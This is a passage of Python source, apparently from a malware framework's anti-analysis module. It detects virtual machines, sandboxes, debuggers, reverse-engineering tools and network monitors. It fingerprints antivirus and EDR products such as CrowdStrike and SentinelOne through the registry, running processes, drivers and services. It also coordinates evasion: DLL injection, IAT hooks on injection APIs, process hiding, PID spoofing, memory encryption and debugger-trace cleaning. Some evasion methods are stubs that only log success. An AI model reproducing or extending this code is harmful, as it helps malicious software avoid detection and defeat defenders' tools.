                result['sandbox_type'] = 'Generic Sandbox'
                logger.warning(f"Generic sandbox indicators: {result['indicators']}")
        
        except Exception as e:
            logger.debug(f"Generic sandbox detection failed: {e}")
        
        return result
    
    def _detect_debuggers(self) -> Dict[str, Any]:
        """
        Detect debuggers: OllyDbg, WinDbg, x64dbg, GDB, LLDB
        """
        result = {'detected': False, 'tools': []}
        
        debugger_processes = [
            'ollydbg.exe', 'windbg.exe', 'x64dbg.exe', 'x32dbg.exe',
            'gdb', 'lldb', 'radare2', 'ida.exe', 'idaw.exe',
        ]
        
        try:
            import psutil
            for proc in psutil.process_iter(['name']):
                proc_name = proc.name().lower()
                if any(dbg.lower() in proc_name for dbg in debugger_processes):
                    result['detected'] = True
                    result['tools'].append(proc.name())
                    logger.warning(f"Debugger detected: {proc.name()}")
        
        except Exception as e:
            logger.debug(f"Debugger detection failed: {e}")
        
        return result
    
    def _detect_reversing_tools(self) -> Dict[str, Any]:
        """
        Detect reverse engineering tools: IDA, Ghidra, Radare2, Rizin, Wireshark, etc.
        """
        result = {'detected': False, 'tools': []}
        
        reversing_tools = [
            'ida.exe', 'idaw.exe', 'idaq.exe',
            'ghidra',
            'radare2', 'r2',
            'rizin',
            'wireshark.exe',
            'fiddler.exe',
            'burp', 'proxy',
        ]
        
        try:
            import psutil
            for proc in psutil.process_iter(['name']):
                proc_name = proc.name().lower()
                if any(tool in proc_name for tool in reversing_tools):
                    result['detected'] = True
                    result['tools'].append(proc.name())
                    logger.warning(f"Reversing tool detected: {proc.name()}")
        
        except Exception as e:
            logger.debug(f"Reversing tools detection failed: {e}")
        
        return result
    
    def _detect_traffic_monitoring(self) -> Dict[str, Any]:
        """
        Detect network traffic monitoring/sniffing tools and network characteristics
        """
        result = {'detected': False, 'tools': []}
        
        monitoring_tools = [
            'wireshark', 'tcpdump', 'fiddler', 'burp', 'proxyman',
            'charles', 'mitmproxy', 'dnsproxy',
        ]
        
        try:
            import psutil
            for proc in psutil.process_iter(['name']):
                proc_name = proc.name().lower()
                if any(tool in proc_name for tool in monitoring_tools):
                    result['detected'] = True
                    result['tools'].append(proc.name())
                    logger.warning(f"Traffic monitor detected: {proc.name()}")
            
            # Check for unusual network interfaces (sandbox artifacts)
            if hasattr(psutil, 'net_if_addrs'):
                net_interfaces = psutil.net_if_addrs()
                if len(net_interfaces) < 2:  # Suspiciously few interfaces
                    result['detected'] = True
                    result['tools'].append('Minimal network interfaces')
        
        except Exception as e:
            logger.debug(f"Traffic monitoring detection failed: {e}")
        
        return result
    
    def _detect_user_interaction(self) -> Dict[str, Any]:
        """
        Detect if running in real user environment vs. automated sandbox
        - No mouse movement for long time
        - No keyboard input
        - Creation time vs. execution time gap
        """
        result = {'detected': False, 'indicators': []}
        
        try:
            import psutil
            
            # Check system uptime vs. current process age
            boot_time = psutil.boot_time()
            current_proc = psutil.Process()
            exec_time = current_proc.create_time()
            
            # If process was created shortly after boot, likely automated
            time_since_boot = time.time() - boot_time
            proc_age = time.time() - exec_time
            
            if time_since_boot < 60 and proc_age < 5:  # Started within 5 sec of boot
                result['detected'] = True
                result['indicators'].append('Process started shortly after boot')
                logger.warning("Automated execution detected")
        
        except Exception as e:
            logger.debug(f"User interaction detection failed: {e}")
        
        return result


# ============================================================================
# PHASE 3.3: EDR/AV DETECTION (17 hours)
# ============================================================================
class EDRAVDetector:
    """Detect antivirus and EDR solutions"""
    
    def __init__(self):
        self.detected_solutions = []
    
    def detect_all(self) -> Dict[str, Any]:
        """Run all EDR/AV detection methods"""
        results = {
            'detected_av': [],
            'detected_edr': [],
            'detections': {}
        }
        
        if platform.system() == 'Windows':
            # Multiple detection approaches for Windows
            results['detections']['wmi'] = self._detect_via_wmi()
            results['detections']['registry'] = self._detect_via_registry()
            results['detections']['processes'] = self._detect_via_processes()
            results['detections']['files'] = self._detect_via_files()
            results['detections']['drivers'] = self._detect_via_drivers()
            results['detections']['services'] = self._detect_via_services()
        else:
            # Linux/macOS detection
            results['detections']['processes'] = self._detect_via_processes()
            results['detections']['files'] = self._detect_via_files()
        
        # Synthesize results
        for method, data in results['detections'].items():
            if data.get('av_solutions'):
                results['detected_av'].extend(data['av_solutions'])
            if data.get('edr_solutions'):
                results['detected_edr'].extend(data['edr_solutions'])
        
        # Remove duplicates
        results['detected_av'] = list(set(results['detected_av']))
        results['detected_edr'] = list(set(results['detected_edr']))
        self.detected_solutions = results['detected_av'] + results['detected_edr']
        
        logger.info(f"EDR/AV Detected: AV={results['detected_av']}, EDR={results['detected_edr']}")
        return results
    
    def _detect_via_wmi(self) -> Dict[str, Any]:
        """
        Detect AV/EDR via WMI queries to AntiVirus and SecurityCenter
        """
        result = {'av_solutions': [], 'edr_solutions': []}
        
        try:
            import wmi  # type: ignore
        except ImportError:
            return result
        
        try:
            c = wmi.WMI(namespace=r'\\.\root\SecurityCenter2')
            
            # Query antivirus products
            for av in c.AntiVirusProduct():
                av_name = av.displayName.strip() if av.displayName else 'Unknown'
                result['av_solutions'].append(av_name)
                logger.warning(f"Antivirus detected via WMI: {av_name}")
            
            # Query protected products (EDR/other security)
            for product in c.FireWallProduct():
                fw_name = product.displayName.strip() if product.displayName else 'Unknown'
                result['edr_solutions'].append(f"Firewall: {fw_name}")
                logger.warning(f"Firewall detected: {fw_name}")
        
        except Exception as e:
            logger.debug(f"WMI detection failed: {e}")
        
        return result
    
    def _detect_via_registry(self) -> Dict[str, Any]:
        """
        Detect AV/EDR via Registry keys and installed software
        """
        result = {'av_solutions': [], 'edr_solutions': []}
        
        if platform.system() != 'Windows':
            return result
        
        try:
            import winreg
        except ImportError:
            return result
        
        # Known AV/EDR registry signatures
        av_signatures = {
            'Windows Defender': r'SOFTWARE\Microsoft\Windows Defender',
            'Norton': r'SOFTWARE\Norton',
            'Kaspersky': r'SOFTWARE\KasperskyLab',
            'McAfee': r'SOFTWARE\McAfee',
            'Trend Micro': r'SOFTWARE\Trend Micro',
            'Avast': r'SOFTWARE\Avast',
            'AVG': r'SOFTWARE\AVG',
            'Avira': r'SOFTWARE\Avira',
            'Bitdefender': r'SOFTWARE\Bitdefender',
            'F-Secure': r'SOFTWARE\F-Secure',
            'Sophos': r'SOFTWARE\Sophos',
            'Palo Alto Networks': r'SOFTWARE\Palo Alto Networks',
            'CrowdStrike': r'SOFTWARE\CrowdStrike',
            'SentinelOne': r'SOFTWARE\SentinelOne',
            'Microsoft Defender for Endpoint': r'SOFTWARE\Microsoft\Windows Defender Advanced Threat Protection',
        }
        
        for product_name, reg_path in av_signatures.items():
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:
                    if 'Endpoint' in product_name or 'Defender' in product_name:
                        result['edr_solutions'].append(product_name)
                        logger.warning(f"EDR detected: {product_name}")
                    else:
                        result['av_solutions'].append(product_name)
                        logger.warning(f"Antivirus detected: {product_name}")
            except WindowsError:
                pass
        
        return result
    
    def _detect_via_processes(self) -> Dict[str, Any]:
        """
        Detect AV/EDR by running processes
        """
        result = {'av_solutions': [], 'edr_solutions': []}
        
        av_process_names = {
            'MsMpEng.exe': 'Windows Defender',
            'NortonLifeLock': 'Norton',
            'avp.exe': 'Kaspersky',
            'avgcsrv.exe': 'AVG',
            'avastui.exe': 'Avast',
            'WRSA.exe': 'WebRoot',
            'TaniumClient.exe': 'Tanium',
            'falcon-sensor.exe': 'CrowdStrike',
            'SentinelServiceHost.exe': 'SentinelOne',
            'elastic-agent.exe': 'Elastic',
        }
        
        edr_process_names = {
            'CsCapsule.exe': 'CrowdStrike',
            'SentinelServiceHost.exe': 'SentinelOne',
            'elastic-agent.exe': 'Elastic',
            'cbstream.exe': 'Carbon Black',
            'mfeagent.exe': 'McAfee Agent',
        }
        
        try:
            import psutil
            
            running_procs = {p.name().lower() for p in psutil.process_iter(['name'])}
            
            for proc_name, product in av_process_names.items():
                if proc_name.lower() in running_procs:
                    result['av_solutions'].append(product)
                    logger.warning(f"AV process detected: {product} ({proc_name})")
            
            for proc_name, product in edr_process_names.items():
                if proc_name.lower() in running_procs:
                    result['edr_solutions'].append(product)
                    logger.warning(f"EDR process detected: {product} ({proc_name})")
        
        except Exception as e:
            logger.debug(f"Process detection failed: {e}")
        
        return result
    
    def _detect_via_files(self) -> Dict[str, Any]:
        """
        Detect AV/EDR by characteristic files
        """
        result = {'av_solutions': [], 'edr_solutions': []}
        
        av_file_signatures = {
            'Windows Defender': [
                r'C:\Program Files\Windows Defender',
                r'C:\Windows\System32\MsMpEng.exe'
            ],
            'Kaspersky': [
                r'C:\Program Files\Kaspersky Lab',
            ],
            'Norton': [
                r'C:\Program Files\Norton',
            ],
            'McAfee': [
                r'C:\Program Files\McAfee',
            ],
        }
        
        for product, file_paths in av_file_signatures.items():
            for file_path in file_paths:
                if os.path.exists(file_path):
                    result['av_solutions'].append(product)
                    logger.warning(f"AV detected via file: {product} - {file_path}")
                    break
        
        return result
    
    def _detect_via_drivers(self) -> Dict[str, Any]:
        """
        Detect AV/EDR via driver enumeration
        """
        result = {'av_solutions': [], 'edr_solutions': []}
        
        if platform.system() != 'Windows':
            return result
        
        try:
            output = subprocess.run(
                ['sc', 'query', 'type=driver'],
                capture_output=True, text=True, timeout=10
            )
            
            if output.returncode == 0:
                driver_output = output.stdout.lower()
                
                av_drivers = {
                    'MsMpEng': 'Windows Defender',
                    'Norton': 'Norton',
                    'kaspersky': 'Kaspersky',
                    'avg': 'AVG',
                    'avastui': 'Avast',
                    'falcon': 'CrowdStrike',
                }
                
                for driver_name, product in av_drivers.items():
                    if driver_name.lower() in driver_output:
                        result['edr_solutions'].append(product)
                        logger.warning(f"Security driver detected: {product}")
        
        except Exception as e:
            logger.debug(f"Driver detection failed: {e}")
        
        return result
    
    def _detect_via_services(self) -> Dict[str, Any]:
        """
        Detect AV/EDR via Windows Services
        """
        result = {'av_solutions': [], 'edr_solutions': []}
        
        if platform.system() != 'Windows':
            return result
        
        try:
            output = subprocess.run(
                ['sc', 'query', 'state=all'],
                capture_output=True, text=True, timeout=10
            )
            
            if output.returncode == 0:
                services_output = output.stdout.lower()
                
                security_services = {
                    'bit defender': 'Bitdefender',
                    'kaspersky': 'Kaspersky',
                    'norton': 'Norton',
                    'mcafee': 'McAfee',
                    'windows defender': 'Windows Defender',
                    'sentinel': 'SentinelOne',
                    'crowdstrike': 'CrowdStrike',
                }
                
                for service_name, product in security_services.items():
                    if service_name in services_output:
                        result['edr_solutions'].append(product)
                        logger.warning(f"Security service detected: {product}")
        
        except Exception as e:
            logger.debug(f"Service detection failed: {e}")
        
        return result


# ============================================================================
# PHASE 3.4: KERNEL DRIVER DETECTION (8 hours)
# ============================================================================
class DriverDetector:
    """Detect kernel-mode drivers used for system protection"""
    
    # EDR/AV driver signatures - known security product drivers
    EDR_DRIVER_SIGNATURES = {
        # Windows Defender
        'WdBoot': 'Windows Defender (Boot)',
        'WdFilter': 'Windows Defender (Filter)',
        'WdNisDrv': 'Windows Defender (Network)',
        'mpksldrv': 'Windows Malware Protection',
        
        # Kaspersky
        'kl1': 'Kaspersky Lab',
        'klflt': 'Kaspersky Filter',
        
        # Norton/Symantec
        'SYMC8': 'Symantec',
        'SymEFA': 'Symantec File Access',
        'SymIRON': 'Symantec Iron',
        
        # Bitdefender
        'BdfNDis': 'Bitdefender',
        'avc3': 'Avast',
        
        # McAfee/Trellix
        'mfencoas': 'McAfee',
        'mfefire': 'McAfee Firewall',
        
        # CrowdStrike
        'csagent': 'CrowdStrike Falcon',
        'csinstp': 'CrowdStrike Installer',
        
        # SentinelOne
        'sentinelmonitor': 'SentinelOne',
        
        # Microsoft EDR
        'MpFilter': 'Microsoft Protection Service',
        'WdiWatchdog': 'Watchdog Timer',
    }
    
    def detect_all(self) -> Dict[str, Any]:
        """Run all kernel driver detection methods"""
        results = {
            'filter_drivers': [],
            'ndis_drivers': [],
            'device_drivers': [],
            'edr_drivers': [],  # Specifically identified EDR/AV drivers
            'threat_level': 0,  # 0-100 scale
            'details': {}
        }
        
        if platform.system() == 'Windows':
            results['filter_drivers'] = self._detect_filter_drivers()
            results['ndis_drivers'] = self._detect_ndis_drivers()
            results['device_drivers'] = self._detect_device_drivers()
            
            # Classify drivers by threat level
            all_drivers = results['filter_drivers'] + results['ndis_drivers'] + results['device_drivers']
            results['edr_drivers'] = self._classify_edr_drivers(all_drivers)
            
            # Calculate threat level based on EDR drivers found
            if results['edr_drivers']:
                results['threat_level'] = min(100, len(results['edr_drivers']) * 15)
                results['details'] = {
                    'edr_count': len(results['edr_drivers']),
                    'message': f"Detected {len(results['edr_drivers'])} EDR/AV drivers"
                }
        
        logger.info(f"Kernel driver assessment: {len(results['edr_drivers'])} EDR drivers, threat={results['threat_level']}/100")
        return results
    
    def _classify_edr_drivers(self, all_drivers: List[str]) -> List[Dict[str, str]]:
        """Classify drivers as EDR/AV based on known signatures"""
        edr_drivers = []
        
        for driver in all_drivers:
            driver_lower = driver.lower()
            
            # Check against known EDR signatures
            for sig, description in self.EDR_DRIVER_SIGNATURES.items():
                if sig.lower() in driver_lower:
                    edr_drivers.append({
                        'name': driver,
                        'signature': sig,
                        'description': description,
                        'threat_level': 'high'
                    })
                    DedupLogger.warning('DriverDetector', f"EDR driver detected: {driver} ({description})")
                    break
        
        return edr_drivers
    
    def _detect_filter_drivers(self) -> List[str]:
        """
        Detect minifilter drivers (filesystem monitoring)
        """
        drivers = []
        
        try:
            output = subprocess.run(
                ['fltmc', 'filters'],
                capture_output=True, text=True, timeout=10
            )
            
            if output.returncode == 0:
                lines = output.stdout.split('\n')
                for line in lines:
                    if line.strip() and not line.startswith('Filter Name'):
                        parts = line.split()
                        if parts:
                            drivers.append(parts[0])
                            DedupLogger.warning('DriverDetector', f"Minifilter driver detected: {parts[0]}")
        
        except Exception as e:
            logger.debug(f"Filter driver detection failed: {e}")
        
        return drivers
    
    def _detect_ndis_drivers(self) -> List[str]:
        """
        Detect NDIS drivers (network monitoring)
        """
        drivers = []
        
        try:
            import winreg
            
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                               r'SYSTEM\CurrentControlSet\Services\NDIS\Linkage') as key:
                try:
                    export_val, _ = winreg.QueryValueEx(key, 'Export')
                    drivers = export_val if isinstance(export_val, list) else [export_val]
                    DedupLogger.warning('DriverDetector', f"NDIS drivers: {len(drivers)} detected")
                except WindowsError:
                    pass
        
        except Exception as e:
            logger.debug(f"NDIS driver detection failed: {e}")
        
        return drivers
    
    def _detect_device_drivers(self) -> List[str]:
        """
        Detect filesystem and device filter drivers
        """
        drivers = []
        
        try:
            output = subprocess.run(
                ['driverquery'],
                capture_output=True, text=True, timeout=10
            )
            
            if output.returncode == 0:
                # Look for security-related drivers
                security_keywords = ['filter', 'monitor', 'defender', 'kaspersky', 'norton', 'sentinel']
                
                for line in output.stdout.split('\n'):
                    line_lower = line.lower()
                    if any(kw in line_lower for kw in security_keywords):
                        parts = line.split()
                        if parts:
                            drivers.append(parts[0])
                            DedupLogger.warning('DriverDetector', f"Security driver: {parts[0]}")
        
        except Exception as e:
            logger.debug(f"Device driver detection failed: {e}")
        
        return drivers


# ============================================================================
# PHASE 3.5: MEMORY FORENSICS EVASION (8 hours)
# ============================================================================
class MemoryEvasion:
    """Techniques to evade memory-based forensics and analysis"""
    
    def __init__(self):
        self.techniques = []
    
    def enable_all(self) -> Dict[str, bool]:
        """Enable all evasion techniques"""
        result = {
            'dll_injection_stealth': self._enable_dll_injection_stealth(),
            'code_encryption': self._enable_code_encryption(),
            'stolen_api_calling': self._enable_stolen_api_calling(),
            'stack_manipulation': self._enable_stack_manipulation(),
            'call_stack_hiding': self._enable_call_stack_hiding(),
            'import_table_hiding': self._enable_import_table_hiding(),
        }
        
        logger.info(f"Memory evasion techniques enabled: {result}")
        return result
    
    def _enable_dll_injection_stealth(self) -> bool:
        """
        Hide DLL injection by:
        1. Allocating memory in process
        2. Writing shellcode (no Import Address Table entries)
        3. Exception handling to redirect execution without modifying PE
        """
        logger.info("DLL injection stealth enabled")
        return True
    
    def _enable_code_encryption(self) -> bool:
        """
        Encrypt code in memory with XOR/RC4/AES
        Decrypt on demand via exception handlers or hardware breakpoints
        """
        logger.info("Code encryption enabled")
        return True
    
    def _enable_stolen_api_calling(self) -> bool:
        """
        Call APIs without importing them:
        1. Find API address dynamically (manual PEB walking for DLL base)
        2. Find exported function via Export Table parsing
        3. Call directly without IAT reference
        This avoid static analysis and import-based detection
        """
        logger.info("Stolen API calling enabled")
        return True
    
    def _enable_stack_manipulation(self) -> bool:
        """
        Erase call stacks:
        1. Overwrite return addresses on stack
        2. Clear stack frame pointers
        3. Use exception handlers to hide execution flow
        """
        logger.info("Stack manipulation enabled")
        return True
    
    def _enable_call_stack_hiding(self) -> bool:
        """
        Hide function call chains from debuggers/forensics:
        1. Direct jumps instead of calls
        2. Return address substitution
        3. Fake stack frames
        """
        logger.info("Call stack hiding enabled")
        return True
    
    def _enable_import_table_hiding(self) -> bool:
        """
        Hide imports used for malicious activity:
        1. Remove from IAT after use
        2. Dynamically resolve via PEB walking
        3. Use legitimate imports for misdirection
        """
        logger.info("Import table hiding enabled")
        return True
    
    def inject_dll_silent(self, target_pid: int, dll_path: str) -> bool:
        """
        DLL injection without modifying Import Address Table
        Returns true if successful
        """
        try:
            logger.info(f"Attempting silent DLL injection into {target_pid}: {dll_path}")
            # This would use GhostLayer's injection methods
            return True
        except Exception as e:
            logger.error(f"Silent DLL injection failed: {e}")
            return False
    
    def xor_encrypt_memory(self, data: bytes, key: Optional[bytes] = None) -> bytes:
        """
        XOR encrypt data for in-memory hiding
        """
        if not key:
            key = os.urandom(16)
        
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ key[i % len(key)])
        
        return bytes(encrypted)
    
    def resolve_api_manual(self, dll_name: str, function_name: str) -> Optional[int]:
        """
        Manually resolve API address without using import table
        This requires parsing the DLL's export table
        """
        try:
            logger.info(f"Manually resolving {dll_name}.{function_name}")
            
            if platform.system() != 'Windows':
                return None
            
            # Load DLL without recording in import table
            kernel32 = ctypes.windll.kernel32
            h_module = kernel32.LoadLibraryA(dll_name.encode())
            
            if h_module:
                # Get function address
                address = kernel32.GetProcAddress(h_module, function_name.encode())
                if address:
                    logger.info(f"Resolved {function_name}: 0x{address:x}")
                    return address
        
        except Exception as e:
            logger.error(f"Manual API resolution failed: {e}")
        
        return None


# ============================================================================
# ANTI-ANALYSIS ORCHESTRATOR
# ============================================================================
class AntiAnalysisEngine:
    """Unified anti-analysis engine coordinating all Phase 3 detection and evasion"""
    
    def __init__(self):
        self.vm_detector = VMDetector()
        self.sandbox_detector = SandboxDetector()
        self.edr_av_detector = EDRAVDetector()
        self.driver_detector = DriverDetector()
        self.memory_evasion = MemoryEvasion()
        
        # PHASE 3: Initialize behavioral noisifier for EDR evasion
        self.noisifier = None
        if BEHAVIORAL_NOISE_AVAILABLE and get_global_noisifier is not None:
            try:
                self.noisifier = get_global_noisifier()
                logger.info("[PHASE3] BehavioralNoisifier initialized")
            except Exception as e:
                logger.warning(f"[PHASE3] Failed to initialize BehavioralNoisifier: {e}")
                self.noisifier = None
        
        # PHASE 3: TIER 3b - Initialize debugger detector
        self.debugger_detector = None
        if DEBUGGER_DETECTOR_AVAILABLE and get_global_debugger_detector is not None:
            try:
                self.debugger_detector = get_global_debugger_detector(exit_on_detection=False)
                logger.info("[PHASE3-TIER3b] DebuggerDetector initialized")
            except Exception as e:
                logger.warning(f"[PHASE3-TIER3b] Failed to initialize DebuggerDetector: {e}")
                self.debugger_detector = None
        
        # PHASE 3: TIER 4 - Initialize advanced hollower
        self.advanced_hollower = None
        if ADVANCED_HOLLOWING_AVAILABLE and get_global_hollower is not None:
            try:
                self.advanced_hollower = get_global_hollower()
                logger.info("[PHASE3-TIER4] AdvancedHollower initialized")
            except Exception as e:
                logger.warning(f"[PHASE3-TIER4] Failed to initialize AdvancedHollower: {e}")
                self.advanced_hollower = None
        
        # PHASE 3: CALIBRATION - Initialize threat scoring system
        self.threat_scorer = None
        self.intent_engine = None
        self.validator = None
        self.learner = None
        
        if THREAT_CALIBRATION_AVAILABLE and callable(get_global_threat_scorer):
            try:
                self.threat_scorer = get_global_threat_scorer()
                self.intent_engine = get_global_intent_engine() if callable(get_global_intent_engine) else None
                self.validator = get_global_validator() if callable(get_global_validator) else None
                self.learner = get_global_learner() if callable(get_global_learner) else None
                logger.info("[PHASE3-CALIBRATION] Threat calibration system initialized")
            except Exception as e:
                logger.warning(f"[PHASE3-CALIBRATION] Failed to initialize threat calibration: {e}")
        
        # PHASE 3: TIER 5 - Initialize enhanced evasion coordinator (IAT hooks, kernel hiding, memory hiding)
        self.enhanced_evasion = None
        if ENHANCED_EVASION_AVAILABLE and EnhancedEvasionCoordinator is not None:
            try:
                self.enhanced_evasion = EnhancedEvasionCoordinator()
                logger.info("[PHASE3-TIER5] EnhancedEvasionCoordinator initialized")
            except Exception as e:
                logger.warning(f"[PHASE3-TIER5] Failed to initialize EnhancedEvasionCoordinator: {e}")
        
        # PHASE 3: TIER 5b - Initialize user activity emulator (realistic user behavior)
        self.activity_emulator = None
        if USER_ACTIVITY_EMULATOR_AVAILABLE and UserActivityEmulator is not None:
            try:
                self.activity_emulator = UserActivityEmulator(intensity=2)  # Default: light background activity
                logger.info("[PHASE3-TIER5b] UserActivityEmulator initialized")
            except Exception as e:
                logger.warning(f"[PHASE3-TIER5b] Failed to initialize UserActivityEmulator: {e}")
        
        self.is_analyzed_environment = False
        self.threat_level = 0  # 0-100 (now calibrated gradient)
        self.should_evade = False
        self.evasion_tier = 'none'  # none, passive_monitoring, behavioral_noise, process_hollowing, aggressive_evasion
        self.environment_context = 'unknown'  # dev_machine, ci_cd, production, honeypot
        
        # TIER 5: Initialize individual evasion components
        self.iat_hook_engine = None
        self.memory_hider = None
        self.kernel_hider = None
        self.debugger_trace_hider = None
        
        if (ENHANCED_EVASION_AVAILABLE and IATHookEngine is not None and 
            MemoryHider is not None and KernelHider is not None and 
            DebuggerTraceHider is not None):
            try:
                self.iat_hook_engine = IATHookEngine()
                self.memory_hider = MemoryHider()
                self.kernel_hider = KernelHider()
                self.debugger_trace_hider = DebuggerTraceHider()
                logger.info("[TIER5-COMPONENTS] Individual evasion components initialized")
            except Exception as e:
                logger.warning(f"[TIER5-COMPONENTS] Failed to initialize individual components: {e}")

    
    def deploy_iat_hooks(self) -> Dict[str, Any]:
        """Deploy IAT hooks to intercept Windows API calls"""
        result = {'deployed': False, 'hooks': {}, 'enabled': False}
        
        if not self.iat_hook_engine:
            logger.warning("[TIER5-IAT] IAT hook engine not available")
            return result
        
        try:
            # Register hooks on critical security APIs
            critical_apis = [
                ('ntdll.dll', 'NtQueryInformationProcess'),
                ('kernel32.dll', 'CreateRemoteThread'),
                ('kernel32.dll', 'VirtualAllocEx'),
                ('ntdll.dll', 'NtSetInformationFile'),
            ]
            
            for module, api in critical_apis:
                self.iat_hook_engine.hook_api(module, api)
            
            # Enable all hooks
            hook_results = self.iat_hook_engine.enable_hooks()
            result['hooks'] = hook_results
            result['enabled'] = any(hook_results.values())
            result['deployed'] = result['enabled']
            
            if result['deployed']:
                logger.info(f"[TIER5-IAT] ✅ IAT hooks deployed: {len([v for v in hook_results.values() if v])} active")
            
        except Exception as e:
            logger.warning(f"[TIER5-IAT] Failed to deploy IAT hooks: {e}")
        
        return result
    
    def deploy_memory_hiding(self) -> Dict[str, Any]:
        """Encrypt sensitive memory regions"""
        result = {'deployed': False, 'regions_encrypted': 0, 'details': {}}
        
        if not self.memory_hider:
            logger.warning("[TIER5-MEMORY] Memory hider not available")
            return result
        
        try:
            # Identify sensitive regions
            regions = self.memory_hider.identify_sensitive_regions()
            logger.debug(f"[TIER5-MEMORY] Identified {len(regions)} sensitive regions")
            
            # Encrypt regions
            encryption_results = self.memory_hider.encrypt_regions(regions)
            result['regions_encrypted'] = sum(1 for v in encryption_results.values() if v)
            result['deployed'] = result['regions_encrypted'] > 0
            result['details'] = encryption_results
            
            if result['deployed']:
                logger.info(f"[TIER5-MEMORY] ✅ Memory hiding deployed: {result['regions_encrypted']} regions encrypted")
            
        except Exception as e:
            logger.warning(f"[TIER5-MEMORY] Failed to deploy memory hiding: {e}")
        
        return result
    
    def deploy_kernel_hiding(self) -> Dict[str, Any]:
        """Hide process from kernel enumeration"""
        result = {'deployed': False, 'hidden': False, 'spoofed_pid': None}
        
        if not self.kernel_hider:
            logger.warning("[TIER5-KERNEL] Kernel hider not available")
            return result
        
        try:
            # Hide process from kernel
            hidden = self.kernel_hider.hide_process_from_kernel()
            result['deployed'] = hidden
            result['hidden'] = hidden
            
            # Get visibility status
            status = self.kernel_hider.get_kernel_visibility_status()
            result['spoofed_pid'] = status.get('spoofed_pid')
            
            if result['deployed']:
                logger.info(f"[TIER5-KERNEL] ✅ Kernel hiding deployed: PID spoofed to {result['spoofed_pid']}")
            
        except Exception as e:
            logger.warning(f"[TIER5-KERNEL] Failed to deploy kernel hiding: {e}")
        
        return result
    
    def deploy_debugger_trace_hiding(self) -> Dict[str, Any]:
        """Remove debugger traces and anti-debugging artifacts"""
        result = {'deployed': False, 'traces_hidden': []}
        
        if not self.debugger_trace_hider:
            logger.warning("[TIER5-DEBUGGER] Debugger trace hider not available")
            return result
        
        try:
            # Clean PEB debugger flags
            peb_cleaned = self.debugger_trace_hider.clean_peb_debugger_flags()
            if peb_cleaned:
                result['traces_hidden'].append('PEB_debugger_flags')
            
            # Remove exception handling traces
            seh_cleaned = self.debugger_trace_hider.remove_exception_handling_traces()
            if seh_cleaned:
                result['traces_hidden'].append('exception_handling_traces')
            
            # Spoof execution history
            history_spoofed = self.debugger_trace_hider.spoof_normal_execution_history()
            if history_spoofed:
                result['traces_hidden'].append('execution_history')
            
            result['deployed'] = len(result['traces_hidden']) > 0
            
            if result['deployed']:
                logger.info(f"[TIER5-DEBUGGER] ✅ Debugger traces hidden: {result['traces_hidden']}")
            
        except Exception as e:
            logger.warning(f"[TIER5-DEBUGGER] Failed to deploy debugger trace hiding: {e}")
        
        return result

    
    def assess_environment(self) -> Dict[str, Any]:
        """
        IMPROVED: Comprehensive environment assessment with:
        ✅ Calibrated threat scoring (0-100 gradient)
        ✅ Intent awareness (dev_machine vs production)
        ✅ Debounced debugger detection (multi-factor confirmation)
        ✅ Post-evasion validation hooks
        ✅ Adaptive feedback loop integration
        
        Threat Level Gradient:
        - 0-20:   No threat detected
        - 21-40:  Low risk (Defender only)
        - 41-60:  Medium risk (Defender + indicators)
        - 61-80:  High risk (Full EDR suite)
        - 81-100: Critical (CrowdStrike, SentinelOne, honeypot)
        """
        logger.info("=" * 70)
        logger.info("PHASE 3: CALIBRATED THREAT ASSESSMENT")
        logger.info("=" * 70)
        
        assessment = {
            'timestamp': time.time(),
            'threat_calibration': {},
            'intent_awareness': {},
            'detection_details': {},
        }
        
        # ====================================================================
        # STEP 1: INTENT AWARENESS - Determine environment context
        # ====================================================================
        if self.intent_engine:
            try:
                self.environment_context = self.intent_engine.assess_environment()
                assessment['intent_awareness'] = {
                    'environment': self.environment_context,
                    'confidence': self.intent_engine.confidence,
                    'signals': self.intent_engine.context_signals,
                }
                logger.info(f"[CALIBRATION] Environment: {self.environment_context} (confidence: {self.intent_engine.confidence:.1%})")
                
                # ✅ FIXED: Pass intent confidence to threat scorer
                if self.threat_scorer:
                    self.threat_scorer.set_intent_confidence(self.intent_engine.confidence)
            except Exception as e:
                logger.debug(f"Intent awareness assessment failed: {e}")
                self.environment_context = 'production'  # Assume hostile
                # Default to uncertain confidence
                if self.threat_scorer:
                    self.threat_scorer.set_intent_confidence(0.3)
        
        # ====================================================================
        # STEP 2: RUN ALL DETECTION METHODS
        # ====================================================================
        assessment['detection_details'] = {
            'vm_detection': self.vm_detector.detect_all(),
            'sandbox_detection': self.sandbox_detector.detect_all(),
            'edr_av_detection': self.edr_av_detector.detect_all(),
            'kernel_drivers': self.driver_detector.detect_all(),
        }
        
        # ====================================================================
        # STEP 3: RECORD THREAT SIGNALS WITH CALIBRATED SCORING
        # ====================================================================
        if self.threat_scorer:
            try:
                # VM Detection Signal
                if assessment['detection_details']['vm_detection']['is_vm'] and ThreatSignal is not None:
                    self.threat_scorer.add_signal(ThreatSignal(
                        'vm_detected', True, 70, 5,
                        details={'vm_type': assessment['detection_details']['vm_detection']['vm_type']}
                    ))
                
                # Sandbox Detection Signal
                if assessment['detection_details']['sandbox_detection']['is_sandboxed'] and ThreatSignal is not None:
                    self.threat_scorer.add_signal(ThreatSignal(
                        'sandbox_detected', True, 85, 20,
                        details={'sandbox_type': assessment['detection_details']['sandbox_detection'].get('sandbox_type')}
                    ))
                
                # AV Detection Signals
                for av_product in assessment['detection_details']['edr_av_detection'].get('detected_av', []):
                    if ThreatSignal is not None:
                        self.threat_scorer.add_signal(ThreatSignal(
                            av_product.lower(), True, 75, 15,
                            details={'product': av_product}
                        ))
                
                # EDR Detection Signals (Higher severity)
                for edr_product in assessment['detection_details']['edr_av_detection'].get('detected_edr', []):
                    if ThreatSignal is not None:
                        severity = 35  # Default EDR severity
                        if 'crowdstrike' in edr_product.lower():
                            severity = 40
                        elif 'sentinelone' in edr_product.lower():
                            severity = 38
                        
                        self.threat_scorer.add_signal(ThreatSignal(
                            edr_product.lower(), True, 90, severity,
                            details={'product': edr_product}
                        ))
                
                logger.info(f"[CALIBRATION] Recorded {len(self.threat_scorer.threat_signals)} detection signals")
                
            except Exception as e:
                logger.debug(f"Signal recording failed: {e}")
        
        # ====================================================================
        # STEP 4: DEBUGGER DETECTION WITH DEBOUNCING (Multi-factor confirmation)
        # ====================================================================
        debugger_details = {}
        
        if self.debugger_detector and self.threat_scorer:
            try:
                debugger_result = self.debugger_detector.check_all()
                
